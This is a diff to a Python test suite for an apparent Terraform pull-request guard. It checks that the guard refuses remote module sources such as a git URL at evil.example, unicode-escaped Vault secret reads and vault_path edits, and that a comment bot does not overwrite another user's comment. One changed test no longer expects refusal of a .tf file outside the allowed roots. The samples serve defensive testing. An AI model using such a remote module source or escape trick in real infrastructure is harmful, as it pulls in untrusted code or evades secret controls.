@@ -113,7 +113,10 @@ results = [
     check("symlink refused", symlink_case(), 1),
     check("tab in file name still inspected", guard2("environments/homelab/a\tb.tf", 'data "external" "x" {}\n'), 1),
     check("real tree is not falsely refused", real_tree_case(), 0),
-    check("tf outside roots refused", guard2("payload/main.tf", "x = 1\n"), 1),
+    check("tf file elsewhere does not refuse a homelab PR", guard2("payload/main.tf", "x = 1\n"), 0),
+    check("unicode escape refused", guard('data "vault\\u005fkv_secret_v2" "x" {}\n'), 1),
+    check("vault_path edit in a file that reads Vault refused",
+          guard('ephemeral "vault_kv_secret_v2" "p" {}\n' if False else 'data vault_x y {}\n  vault_path = "iac/minio"\n'), 1),
     check("comment cannot hide a token", guard("# no provisioner here\n"), 1),
     check("one-line module with remote source refused",
           guard('module "x" { source = "git::https://evil.example/x.git" }\n'), 1),
@@ -171,4 +174,26 @@ plan["prior_state"] = {}
 with open(f.name, "w") as g:
     json.dump(plan, g)
 results.append(check("empty state fails", run(sys.executable, S, f.name).returncode, 1))
+def gh_case():
+    """The comment upsert must not edit a comment that another user wrote."""
+    import importlib.util
+    spec = importlib.util.spec_from_file_location("g", os.path.join(HERE, "tf-plan-gh.py"))
+    g = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(g)
+    calls = []
+
+    def api(method, path, body=None):
+        calls.append(method)
+        if method == "GET":
+            return [{"id": 1, "user": {"login": "mallory"}, "body": g.MARK + "x"}]
+        return {}
+    g.api = api
+    with tempfile.NamedTemporaryFile("w", delete=False) as f:
+        f.write("hi")
+    g.upsert("7", f.name)
+    os.unlink(f.name)
+    return calls[-1]
+
+
+results.append(check("another user's marked comment is not edited", gh_case(), "POST"))
 sys.exit(0 if all(results) else 1)
